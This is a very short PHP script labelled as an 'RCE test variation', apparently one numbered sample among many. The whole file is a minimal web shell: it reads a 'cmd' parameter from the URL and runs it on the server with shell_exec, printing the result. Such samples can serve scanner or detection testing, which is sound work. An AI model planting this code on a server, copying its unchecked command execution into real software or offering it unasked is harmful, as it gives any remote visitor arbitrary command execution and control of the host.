<?php
// RCE test variation #955
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>